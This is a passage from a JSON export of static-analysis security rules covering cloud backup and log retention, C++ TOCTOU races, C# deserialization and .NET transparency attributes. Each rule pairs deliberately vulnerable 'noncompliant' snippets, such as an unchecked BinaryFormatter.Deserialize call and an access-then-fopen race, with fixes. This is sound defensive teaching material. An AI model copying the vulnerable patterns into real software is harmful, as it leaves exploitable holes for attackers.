 <li> <code>Microsoft.Synapse/workspaces/auditingSettings</code> - for <a\n  href=\"https://learn.microsoft.com/en-us/azure/templates/microsoft.synapse/2021-06-01/workspaces/auditingsettings\">Microsoft Synapse Workspaces\n  Auditing Settings</a> </li>\n  <li> <code>Microsoft.Synapse/workspaces/sqlPools/securityAlertPolicies</code> - for <a\n  href=\"https://learn.microsoft.com/en-us/azure/templates/microsoft.synapse/workspaces/sqlpools/securityalertpolicies?pivots=deployment-language-bicep\">Microsoft Synapse Workspaces Sql Pools Security Alert Policies</a> </li>\n</ul>\n<h2>Compliant Solution</h2>\n<p>For <a href=\"https://docs.microsoft.com/en-us/azure/firewall-manager/policy-overview\">Azure Firewall Policy</a>:</p>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"name\": \"example\",\n      \"type\": \"Microsoft.Network/firewallPolicies\",\n      \"apiVersion\": \"2022-07-01\",\n      \"properties\": {\n        \"insights\": {\n          \"isEnabled\": true,\n          \"retentionDays\": 30\n        }\n      }\n    }\n  ]\n}\n</pre>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\nresource firewallPolicy 'Microsoft.Network/firewallPolicies@2022-07-01' = {\n  properties: {\n    insights: {\n      isEnabled: true\n      retentionDays: 30\n    }\n  }\n}\n</pre>\n<p>For <a href=\"https://learn.microsoft.com/en-us/azure/templates/microsoft.network/networkwatchers/flowlogs\">Microsoft Network Network Watchers Flow\nLogs</a>:</p>\n<pre data-diff-id=\"3\" data-diff-type=\"compliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"name\": \"networkWatchers/example\",\n      \"type\": \"Microsoft.Network/networkWatchers/flowLogs\",\n      \"apiVersion\": \"2022-07-01\",\n      \"properties\": {\n        \"retentionPolicy\": {\n          \"days\": 30,\n          \"enabled\": true\n        }\n      }\n    }\n  ]\n}\n</pre>\n<pre data-diff-id=\"4\" data-diff-type=\"compliant\">\nresource networkWatchersFlowLogs 'Microsoft.Network/networkWatchers/flowLogs@2022-07-01' = {\n  properties: {\n    retentionPolicy: {\n      days: 30\n      enabled: true\n    }\n  }\n}\n</pre>\n<p>For <a href=\"https://learn.microsoft.com/en-us/azure/templates/microsoft.sql/2021-11-01/servers/auditingsettings\">Microsoft SQL Servers Auditing\nSettings</a>:</p>\n<pre data-diff-id=\"5\" data-diff-type=\"compliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"name\": \"example/default\",\n      \"type\": \"Microsoft.Sql/servers/auditingSettings\",\n      \"apiVersion\": \"2021-11-01\",\n      \"properties\": {\n        \"retentionDays\": 30,\n        \"state\": \"Enabled\"\n      }\n    }\n  ]\n}\n</pre>\n<pre data-diff-id=\"6\" data-diff-type=\"compliant\">\nresource sqlServerAudit 'Microsoft.Sql/servers/auditingSettings@2021-11-01' = {\n  properties: {\n    retentionDays: 30\n  }\n}\n</pre>\n<p>Above code also applies to other types defined in previous paragraph.</p>",
        "severity": "MAJOR"
      },
      "azureresourcemanager:S6364": {
        "name": "Defining a short backup retention duration is security-sensitive",
        "htmlDesc": "<p>Reducing the backup retention duration can reduce an organization’s ability to re-establish service in case of a security incident.</p>\n<p>Data backups allow to overcome corruption or unavailability of data by recovering as efficiently as possible from a security incident.</p>\n<p>Backup retention duration, coverage, and backup locations are essential criteria regarding functional continuity.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> This component is essential for the information system infrastructure. </li>\n  <li> This component is essential for mission-critical functions. </li>\n  <li> Compliance policies require this component to be backed up for a specific amount of time. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Increase the backup retention period to an amount of time sufficient enough to be able to restore service in case of an incident.</p>\n<h2>Sensitive Code Example</h2>\n<p>For <a href=\"https://learn.microsoft.com/en-us/azure/templates/microsoft.web/sites/config-backup?pivots=deployment-language-arm-template\">Azure App\nService</a>:</p>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nresource webApp 'Microsoft.Web/sites@2022-03-01' = {\n  name: 'webApp'\n}\n\nresource backup 'config@2022-03-01' = {\n  name: 'backup'\n  parent: webApp\n  properties: {\n    backupSchedule: {\n      frequencyInterval: 1\n      frequencyUnit: 'Day'\n      keepAtLeastOneBackup: true\n      retentionPeriodInDays: 2  // Sensitive\n    }\n  }\n}\n</pre>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"type\": \"Microsoft.Web/sites\",\n      \"apiVersion\": \"2022-03-01\",\n      \"name\": \"webApp\",\n    },\n    {\n      \"type\": \"Microsoft.Web/sites/config\",\n      \"apiVersion\": \"2022-03-01\",\n      \"name\": \"webApp/backup\",\n      \"properties\": {\n        \"backupSchedule\": {\n          \"frequencyInterval\": 1,\n          \"frequencyUnit\": \"Day\",\n          \"keepAtLeastOneBackup\": true,\n          \"retentionPeriodInDays\": 2\n        }\n      },\n      \"dependsOn\": [\n        \"[resourceId('Microsoft.Web/sites', 'webApp')]\"\n      ]\n    }\n  ]\n}\n</pre>\n<p>For <a href=\"https://learn.microsoft.com/en-us/azure/templates/microsoft.documentdb/databaseaccounts?pivots=deployment-language-arm-template\">Azure\nCosmos DB</a> accounts:</p>\n<pre data-diff-id=\"3\" data-diff-type=\"noncompliant\">\nresource cosmosDb 'Microsoft.DocumentDB/databaseAccounts@2023-04-15' = {\n    properties: {\n        backupPolicy: {\n            type: 'Periodic'\n            periodicModeProperties: {\n                backupIntervalInMinutes: 1440\n                backupRetentionIntervalInHours: 8  // Sensitive\n            }\n        }\n    }\n}\n</pre>\n<pre data-diff-id=\"4\" data-diff-type=\"noncompliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"name\": \"example\",\n      \"type\": \"Microsoft.DocumentDB/databaseAccounts\",\n      \"apiVersion\": \"2023-04-15\",\n      \"properties\": {\n        \"backupPolicy\": {\n          \"type\": \"Periodic\",\n          \"periodicModeProperties\": {\n            \"backupIntervalInMinutes\": 1440,\n            \"backupRetentionIntervalInHours\": 8\n          }\n        }\n      }\n    }\n  ]\n}\n</pre>\n<p>For <a\nhref=\"https://learn.microsoft.com/en-us/azure/templates/microsoft.recoveryservices/vaults/backuppolicies?pivots=deployment-language-arm-template\">Azure\nBackup</a> vault policies:</p>\n<pre data-diff-id=\"5\" data-diff-type=\"noncompliant\">\nresource vault 'Microsoft.RecoveryServices/vaults@2023-01-01' = {\n    name: 'testVault'\n\n    resource backupPolicy 'backupPolicies@2023-01-01' = {\n        name: 'backupPolicy'\n        properties: {\n            backupManagementType: 'AzureSql'\n            retentionPolicy: {\n                retentionPolicyType: 'SimpleRetentionPolicy'\n                retentionDuration: {\n                    count: 2  // Sensitive\n                    durationType: 'Days'\n                }\n            }\n        }\n    }\n}\n</pre>\n<pre data-diff-id=\"6\" data-diff-type=\"noncompliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"type\": \"Microsoft.RecoveryServices/vaults\",\n      \"apiVersion\": \"2023-01-01\",\n      \"name\": \"testVault\",\n      \"resources\": [\n        {\n          \"type\": \"backupPolicies\",\n          \"apiVersion\": \"2023-01-01\",\n          \"name\": \"testVault/backupPolicy\",\n          \"properties\": {\n            \"backupManagementType\": \"AzureSql\",\n            \"retentionPolicy\": {\n              \"retentionPolicyType\": \"SimpleRetentionPolicy\",\n              \"retentionDuration\": {\n                \"count\": 2,\n                \"durationType\": \"Days\"\n              }\n            }\n          }\n        }\n      ]\n    }\n  ]\n}\n</pre>\n<h2>Compliant Solution</h2>\n<p>For <a href=\"https://learn.microsoft.com/en-us/azure/templates/microsoft.web/sites/config-backup?pivots=deployment-language-arm-template\">Azure App\nService</a>:</p>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nresource webApp 'Microsoft.Web/sites@2022-03-01' = {\n  name: 'webApp'\n}\n\nresource backup 'config@2022-03-01' = {\n  name: 'backup'\n  parent: webApp\n  properties: {\n    backupSchedule: {\n      frequencyInterval: 1\n      frequencyUnit: 'Day'\n      keepAtLeastOneBackup: true\n      retentionPeriodInDays: 8\n    }\n  }\n}\n</pre>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"type\": \"Microsoft.Web/sites\",\n      \"apiVersion\": \"2022-03-01\",\n      \"name\": \"webApp\",\n    },\n    {\n      \"type\": \"Microsoft.Web/sites/config\",\n      \"apiVersion\": \"2022-03-01\",\n      \"name\": \"webApp/backup\",\n      \"properties\": {\n        \"backupSchedule\": {\n          \"frequencyInterval\": 1,\n          \"frequencyUnit\": \"Day\",\n          \"keepAtLeastOneBackup\": true,\n          \"retentionPeriodInDays\": 30\n        }\n      },\n      \"dependsOn\": [\n        \"[resourceId('Microsoft.Web/sites', 'webApp')]\"\n      ]\n    }\n  ]\n}\n</pre>\n<p>For <a href=\"https://learn.microsoft.com/en-us/azure/templates/microsoft.documentdb/databaseaccounts?pivots=deployment-language-arm-template\">Azure\nCosmos DB</a> accounts:</p>\n<pre data-diff-id=\"3\" data-diff-type=\"compliant\">\nresource cosmosDb 'Microsoft.DocumentDB/databaseAccounts@2023-04-15' = {\n    properties: {\n        backupPolicy: {\n            type: 'Periodic'\n            periodicModeProperties: {\n                backupIntervalInMinutes: 1440\n                backupRetentionIntervalInHours: 192\n            }\n        }\n    }\n}\n</pre>\n<pre data-diff-id=\"4\" data-diff-type=\"compliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"name\": \"example\",\n      \"type\": \"Microsoft.DocumentDB/databaseAccounts\",\n      \"apiVersion\": \"2023-04-15\",\n      \"properties\": {\n        \"backupPolicy\": {\n          \"type\": \"Periodic\",\n          \"periodicModeProperties\": {\n            \"backupIntervalInMinutes\": 1440,\n            \"backupRetentionIntervalInHours\": 720\n          }\n        }\n      }\n    }\n  ]\n}\n</pre>\n<p>For <a\nhref=\"https://learn.microsoft.com/en-us/azure/templates/microsoft.recoveryservices/vaults/backuppolicies?pivots=deployment-language-arm-template\">Azure\nBackup</a> vault policies:</p>\n<pre data-diff-id=\"5\" data-diff-type=\"compliant\">\nresource vault 'Microsoft.RecoveryServices/vaults@2023-01-01' = {\n    name: 'testVault'\n\n    resource backupPolicy 'backupPolicies@2023-01-01' = {\n        name: 'backupPolicy'\n        properties: {\n            backupManagementType: 'AzureSql'\n            retentionPolicy: {\n                retentionPolicyType: 'SimpleRetentionPolicy'\n                retentionDuration: {\n                    count: 8\n                    durationType: 'Days'\n                }\n            }\n        }\n    }\n}\n</pre>\n<pre data-diff-id=\"6\" data-diff-type=\"compliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"type\": \"Microsoft.RecoveryServices/vaults\",\n      \"apiVersion\": \"2023-01-01\",\n      \"name\": \"testVault\",\n      \"resources\": [\n        {\n          \"type\": \"backupPolicies\",\n          \"apiVersion\": \"2023-01-01\",\n          \"name\": \"testVault/backupPolicy\",\n          \"properties\": {\n            \"backupManagementType\": \"AzureSql\",\n            \"retentionPolicy\": {\n              \"retentionPolicyType\": \"SimpleRetentionPolicy\",\n              \"retentionDuration\": {\n                \"count\": 30,\n                \"durationType\": \"Days\"\n              }\n            }\n          }\n        }\n      ]\n    }\n  ]\n}\n</pre>",
        "severity": "MAJOR"
      },
      "terraform:S6413": {
        "name": "Defining a short log retention duration is security-sensitive",
        "htmlDesc": "<p>Defining a short log retention duration can reduce an organization’s ability to backtrace the actions of malicious actors in case of a security\nincident.</p>\n<p>Logging allows operational and security teams to get detailed and real-time feedback on an information system’s events. The logging coverage\nenables them to quickly react to events, ranging from the most benign bugs to the most impactful security incidents, such as intrusions.</p>\n<p>Apart from security detection, logging capabilities also directly influence future digital forensic analyses. For example, detailed logging will\nallow investigators to establish a timeline of the actions perpetrated by an attacker.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> This component is essential for the information system infrastructure. </li>\n  <li> This component is essential for mission-critical functions. </li>\n  <li> Compliance policies require traceability for a longer duration. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Increase the log retention period to an amount of time sufficient enough to be able to investigate and restore service in case of an incident.</p>\n<h2>Sensitive Code Example</h2>\n<p>For <a href=\"https://docs.aws.amazon.com/AmazonCloudWatch/latest/logs/Working-with-log-groups-and-streams.html\">AWS Cloudwatch Logs</a>:</p>\n<pre>\nresource \"aws_cloudwatch_log_group\" \"example\" {\n  name = \"example\"\n  retention_in_days = 3 # Sensitive\n}\n</pre>\n<p>For <a href=\"https://docs.microsoft.com/en-us/azure/firewall-manager/policy-overview\">Azure Firewall Policy</a>:</p>\n<pre>\nresource \"azurerm_firewall_policy\" \"example\" {\n  insights {\n    enabled = true\n    retention_in_days = 7 # Sensitive\n  }\n}\n</pre>\n<p>For <a href=\"https://cloud.google.com/logging/docs/routing/overview#buckets\">Google Cloud Logging buckets</a>:</p>\n<pre>\nresource \"google_logging_project_bucket_config\" \"example\" {\n    project = var.project\n    location = \"global\"\n    retention_days = 7 # Sensitive\n    bucket_id = \"_Default\"\n}\n</pre>\n<h2>Compliant Solution</h2>\n<p>For <a href=\"https://docs.aws.amazon.com/AmazonCloudWatch/latest/logs/Working-with-log-groups-and-streams.html\">AWS Cloudwatch Logs</a>:</p>\n<pre>\nresource \"aws_cloudwatch_log_group\" \"example\" {\n  name = \"example\"\n  retention_in_days = 30\n}\n</pre>\n<p>For <a href=\"https://docs.microsoft.com/en-us/azure/firewall-manager/policy-overview\">Azure Firewall Policy</a>:</p>\n<pre>\nresource \"azurerm_firewall_policy\" \"example\" {\n  insights {\n    enabled = true\n    retention_in_days = 30\n  }\n}\n</pre>\n<p>For <a href=\"https://cloud.google.com/logging/docs/routing/overview#buckets\">Google Cloud Logging buckets</a>:</p>\n<pre>\nresource \"google_logging_project_bucket_config\" \"example\" {\n    project = var.project\n    location = \"global\"\n    retention_days = 30\n    bucket_id = \"_Default\"\n}\n</pre>",
        "severity": "MAJOR"
      },
      "cpp:S5847": {
        "name": "Accessing files should not introduce TOCTOU vulnerabilities",
        "htmlDesc": "<p>When an application manipulates files, \"Time-Of-Check to Time-Of-Use\" can occur when a file-checking operation is disconnected from the actual\noperation it is bound to.</p>\n<p>For example, such a vulnerability occurs when a file existence check is performed strictly before a file creation operation.</p>\n<h2>Why is this an issue?</h2>\n<p>Race conditions can happen when file operations and their associated pre-checks are disconnected. Indeed, while the application assumes that the\nchecked file property will not change before performing the operation, there is a chance that changes are applied to the file.</p>\n<p>Especially, a concurrent process, which an attacker can control, could modify a file right after a check is performed and before the actual use.\nThis file can be deleted, created, altered, or see its permissions changed depending on the use case.</p>\n<h3>What is the potential impact?</h3>\n<p>The impact of a successfully exploited race condition is dependent on the business logic of the vulnerable application. The consequences will vary\ndepending on what check is performed and how the file is used.</p>\n<p>In general, attackers use such attacks to escalate privileges, execute arbitrary code, or perform a denial of service.</p>\n<h4>Arbitrary code execution</h4>\n<p>Executable or script file integrity and authenticity checks can be bypassed when exploiting a TOCTOU vulnerability. In such a scenario, attackers\nwould change an executable file content between when its integrity is checked and when the application executes it.</p>\n<p>This attack would allow attackers to trick the application into executing malicious, arbitrary code. They would then be granted the same privilege\nlevels as the application itself, which can be particularly severe when it runs with administration privileges.</p>\n<h4>Privileges escalation</h4>\n<p>When the attacker is a local user on the same server as the running application, the same attack is possible with extended probability. In such a\ncase, attackers can exploit the reading and writing to configuration files, the creation of local network resources, or the use of temporary files to\nachieve the same code execution purpose.</p>\n<p>However, in that case, the attack is only meaningful when the application is running with high or otherwise interesting privileges. Attackers\nexploiting a TOCTOU vulnerability that way would achieve horizontal or vertical privilege escalation.</p>\n<h4>Denial of service</h4>\n<p>When the application expects some file properties to be set at the operation time, it will often face unexpected errors when those properties have\nactually changed. This might be the case when writing to a file where newly set permissions forbid that operation or when reading from a deleted\nfile.</p>\n<p>When such errors are faced, the application might unexpectedly stop, which can affect its availability. Depending on the application and hosting\narchitectures, the interruption can be temporary or permanent, partial or complete.</p>\n<h2>How to fix it</h2>\n<p>To prevent TOCTOU race condition issues, best practices recommend relying on file operations that can perform the necessary preliminary checks\natomically. For example, file opening functions usually accept a parameter to check the file exists and return an error depending on the result. This\ncheck is atomic and is not susceptible to race conditions.</p>\n<p>When this is not possible, it might be possible to open a file directly, and to keep a reference to it for later use. If the conditions are set for\nthe subsequent operations, the application can continue with its processing and use the open file pointer to read or write to the file. In the\nopposite case, an error might be raised that will need to be properly handled.</p>\n<p>To finish, for most complex operations, the application can create a dedicated working directory and set tight permissions on it. This needs to be\nperformed atomically to prevent further race conditions. All subsequent sensitive file operations can then be performed in this dedicated\ndirectory.</p>\n<p>Note that this last solution is imperfect and is still susceptible to race condition attacks from privileged users and the application itself. It\nshould be used when no other countermeasure is acceptable.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<p>The following code sample is susceptible to a race condition attack because it checks a file exists strictly before it opens it for writing.</p>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nFILE *fopen_if_not_exists(const char *file) {\n  if (access(file, F_OK) == -1 &amp;&amp; errno == ENOENT) {\n    FILE *f = fopen(file, \"w\"); // Noncompliant\n\n    return f;\n  }\n\n  return nullptr;\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nFILE *fopen_if_not_exists(const char *file) {\n  FILE *f = fopen(file, \"wx\");\n  return f;\n}\n</pre>\n<h3>How does this work?</h3>\n<p>Here, the compliant code example uses an atomic operation to open the file and check for its existence beforehand.</p>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> Carnegie Mellon University Software Engineering Institure - <a\n  href=\"https://wiki.sei.cmu.edu/confluence/display/c/FIO45-C.+Avoid+TOCTOU+race+conditions+while+accessing+files\">FIO45-C. - Avoid TOCTOU race\n  conditions while accessing files</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">Top 10 2021 Category A1 - Broken Access Control</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control\">Top 10 2017 Category A5 - Broken Access Control</a>\n  </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/367\">CWE-367 - Time-of-check Time-of-use (TOCTOU) Race Condition</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "csharpsquid:S5773": {
        "name": "Types allowed to be deserialized should be restricted",
        "htmlDesc": "<p>Deserialization is the process of converting serialized data (such as objects or data structures) back into their original form. Types allowed to\nbe unserialized should be strictly controlled.</p>\n<h2>Why is this an issue?</h2>\n<p>During the deserialization process, the state of an object will be reconstructed from the serialized data stream. By allowing unrestricted\ndeserialization of types, the application makes it possible for attackers to use types with dangerous or otherwise sensitive behavior during the\ndeserialization process.</p>\n<h3>What is the potential impact?</h3>\n<p>When an application deserializes untrusted data without proper restrictions, an attacker can craft malicious serialized objects. Depending on the\naffected objects and properties, the consequences can vary.</p>\n<h3>Remote Code Execution</h3>\n<p>If attackers can craft malicious serialized objects that contain executable code, this code will run within the application’s context, potentially\ngaining full control over the system. This can lead to unauthorized access, data breaches, or even complete system compromise.</p>\n<p>For example, a well-known attack vector consists in serializing an object of type <code><a\nhref=\"https://docs.microsoft.com/en-us/dotnet/api/system.codedom.compiler.tempfilecollection.-ctor?view=netframework-4.8#System_CodeDom_Compiler_TempFileCollection__ctor\">TempFileCollection</a></code>\nwith arbitrary files (defined by an attacker) which will be deleted on the application deserializing this object (when the <a\nhref=\"https://docs.microsoft.com/en-us/dotnet/api/system.codedom.compiler.tempfilecollection.finalize?view=netframework-4.8\">finalize()</a> method of\nthe TempFileCollection object is called). These kinds of specially crafted serialized objects are called \"<a\nhref=\"https://github.com/pwntester/ysoserial.net\">gadgets</a>\".</p>\n<h3>Privilege escalation</h3>\n<p>Unrestricted deserialization can also enable attackers to escalate their privileges within the application. By manipulating the serialized data, an\nattacker can modify object properties or bypass security checks, granting them elevated privileges that they should not have. This can result in\nunauthorized access to sensitive data, unauthorized actions, or even administrative control over the application.</p>\n<h3>Denial of Service</h3>\n<p>In some cases, an attacker can abuse the deserialization process to cause a denial of service (DoS) condition. By providing specially crafted\nserialized data, the attacker can trigger excessive resource consumption, leading to system instability or unresponsiveness. This can disrupt the\navailability of the application, impacting its functionality and causing inconvenience to users.</p>\n<h2>How to fix it</h2>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<p>With <a\nhref=\"https://learn.microsoft.com/en-us/dotnet/api/system.runtime.serialization.formatters.binary.binaryformatter\"><code>BinaryFormatter</code></a>,\n<a\nhref=\"https://learn.microsoft.com/en-us/dotnet/api/system.runtime.serialization.netdatacontractserializer\"><code>NetDataContractSerializer</code></a>\nor <a\nhref=\"https://learn.microsoft.com/en-us/dotnet/api/system.runtime.serialization.formatters.soap.soapformatter\"><code>SoapFormatter</code></a>:</p>\n<pre data-diff-id=\"101\" data-diff-type=\"noncompliant\">\nvar myBinaryFormatter = new BinaryFormatter();\nmyBinaryFormatter.Deserialize(stream); // Noncompliant\n</pre>\n<p>With <a\nhref=\"https://learn.microsoft.com/en-us/dotnet/api/system.web.script.serialization.javascriptserializer\"><code>JavaScriptSerializer</code></a>:</p>\n<pre data-diff-id=\"102\" data-diff-type=\"noncompliant\">\nJavaScriptSerializer serializer1 = new JavaScriptSerializer(new SimpleTypeResolver()); // Noncompliant\nserializer1.Deserialize&lt;ExpectedType&gt;(json);\n</pre>\n<h4>Compliant solution</h4>\n<p>With <a\nhref=\"https://learn.microsoft.com/en-us/dotnet/api/system.runtime.serialization.formatters.binary.binaryformatter\"><code>BinaryFormatter</code></a>,\n<a\nhref=\"https://learn.microsoft.com/en-us/dotnet/api/system.runtime.serialization.netdatacontractserializer\"><code>NetDataContractSerializer</code></a>\nor <a\nhref=\"https://learn.microsoft.com/en-us/dotnet/api/system.runtime.serialization.formatters.soap.soapformatter\"><code>SoapFormatter</code></a>:</p>\n<pre data-diff-id=\"101\" data-diff-type=\"compliant\">\nsealed class CustomBinder : SerializationBinder\n{\n   public override Type BindToType(string assemblyName, string typeName)\n   {\n       if (!(typeName == \"type1\" || typeName == \"type2\" || typeName == \"type3\"))\n       {\n          throw new SerializationException(\"Only type1, type2 and type3 are allowed\");\n       }\n       return Assembly.Load(assemblyName).GetType(typeName);\n   }\n}\n\nvar myBinaryFormatter = new BinaryFormatter();\nmyBinaryFormatter.Binder = new CustomBinder();\nmyBinaryFormatter.Deserialize(stream);\n</pre>\n<p>With <a\nhref=\"https://learn.microsoft.com/en-us/dotnet/api/system.web.script.serialization.javascriptserializer\"><code>JavaScriptSerializer</code></a>:</p>\n<pre data-diff-id=\"102\" data-diff-type=\"compliant\">\npublic class CustomSafeTypeResolver : JavaScriptTypeResolver\n{\n   public override Type ResolveType(string id)\n   {\n      if(id != \"ExpectedType\") {\n         throw new ArgumentNullException(\"Only ExpectedType is allowed during deserialization\");\n      }\n      return Type.GetType(id);\n   }\n}\n\nJavaScriptSerializer serializer = new JavaScriptSerializer(new CustomSafeTypeResolver());\nserializer.Deserialize&lt;ExpectedType&gt;(json);\n</pre>\n<h3>Going the extra mile</h3>\n<p>Instead of using <a\nhref=\"https://learn.microsoft.com/en-us/dotnet/api/system.runtime.serialization.formatters.binary.binaryformatter\"><code>BinaryFormatter</code></a>\nand similar serializers, it is recommended to use safer alternatives in most of the cases, such as <a\nhref=\"https://learn.microsoft.com/en-us/dotnet/api/system.xml.serialization.xmlserializer\"><code>XmlSerializer</code></a> or <a\nhref=\"https://learn.microsoft.com/en-us/dotnet/api/system.runtime.serialization.datacontractserializer\"><code>DataContractSerializer</code></a>.</p>\n<p>If it’s not possible then try to mitigate the risk by restricting the types allowed to be deserialized:</p>\n<ul>\n  <li> by implementing an \"allow-list\" of types, but keep in mind that novel dangerous types are regularly discovered and this protection could be\n  insufficient over time. </li>\n  <li> or/and implementing a tamper protection, such as <a href=\"https://en.wikipedia.org/wiki/HMAC\">message authentication codes</a> (MAC). This way\n  only objects serialized with the correct MAC hash will be deserialized. </li>\n</ul>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> Microsoft Learn - <a\n  href=\"https://learn.microsoft.com/en-us/dotnet/api/system.runtime.serialization.formatters.binary.binaryformatter\">BinaryFormatter Class</a> </li>\n  <li> Microsoft Learn - <a\n  href=\"https://learn.microsoft.com/en-us/dotnet/api/system.runtime.serialization.netdatacontractserializer\">NetDataContractSerializer Class</a> </li>\n  <li> Microsoft Learn - <a\n  href=\"https://learn.microsoft.com/en-us/dotnet/api/system.runtime.serialization.formatters.soap.soapformatter\">SoapFormatter Class</a> </li>\n  <li> Microsoft Learn - <a\n  href=\"https://learn.microsoft.com/en-us/dotnet/api/system.web.script.serialization.javascriptserializer\">JavaScriptSerializer Class</a> </li>\n  <li> Microsoft Learn - <a href=\"https://learn.microsoft.com/en-us/dotnet/api/system.xml.serialization.xmlserializer\">XmlSerializer Class</a> </li>\n  <li> Microsoft Learn - <a\n  href=\"https://learn.microsoft.com/en-us/dotnet/api/system.runtime.serialization.datacontractserializer\">DataContractSerializer Class</a> </li>\n</ul>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> Microsoft Learn - <a href=\"https://docs.microsoft.com/en-us/dotnet/standard/serialization/binaryformatter-security-guide?s=03\">Deserialization\n  risks in use of BinaryFormatter and related types</a> </li>\n  <li> OWASP - <a href=\"https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Deserialization_Cheat_Sheet.md\">Deserialization Cheat\n  Sheet</a> </li>\n  <li> Wikipedia - <a href=\"https://en.wikipedia.org/wiki/HMAC\">Message Authentication Codes (MAC)</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/\">Top 10 2021 Category A8 - Software and Data Integrity\n  Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A8_2017-Insecure_Deserialization\">Top 10 2017 Category A8 - Insecure\n  Deserialization</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/134\">CWE-134 - Use of Externally-Controlled Format String</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/502\">CWE-502 - Deserialization of Untrusted Data</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "csharpsquid:S4211": {
        "name": "Members should not have conflicting transparency annotations",
        "htmlDesc": "<p>Transparency attributes in the .NET Framework, designed to protect security-critical operations, can lead to ambiguities and vulnerabilities when\ndeclared at different levels such as both for the class and a method.</p>\n<h2>Why is this an issue?</h2>\n<p>Transparency attributes can be declared at several levels. If two different attributes are declared at two different levels, the attribute that\nprevails is the one in the highest level. For example, you can declare that a class is <code>SecuritySafeCritical</code> and that a method of this\nclass is <code>SecurityCritical</code>. In this case, the method will be <code>SecuritySafeCritical</code> and the <code>SecurityCritical</code>\nattribute attached to it is ignored.</p>\n<h3>What is the potential impact?</h3>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Elevation of Privileges</h4>\n<p>An attacker could potentially exploit conflicting transparency attributes to perform actions with higher privileges than intended.</p>\n<h4>Data Exposure</h4>\n<p>If a member with conflicting attributes is involved in handling sensitive data, an attacker could exploit the vulnerability to gain unauthorized\naccess to this data. This could lead to breaches of confidentiality and potential data loss.</p>\n<h2>How to fix it</h2>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nusing System;\nusing System.Security;\n\nnamespace MyLibrary\n{\n    [SecuritySafeCritical]\n    public class Foo\n    {\n        [SecurityCritical] // Noncompliant\n        public void Bar()\n        {\n        }\n    }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nusing System;\nusing System.Security;\n\nnamespace MyLibrary\n{\n    public class Foo\n    {\n        [SecurityCritical]\n        public void Bar()\n        {\n        }\n    }\n}\n</pre>\n<h3>How does this work?</h3>\n<h4>Never set class-level annotations</h4>\n<p>A class should never have class-level annotations if some functions have different permission levels. Instead, make sure every function has its own\ncorrect annotation.</p>\n<p>If no function needs a particularly distinct security annotation in a class, just set a class-level <code>[SecurityCritical]</code>.</p>\n<h2>Resources</h2>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> Redgate Hub - 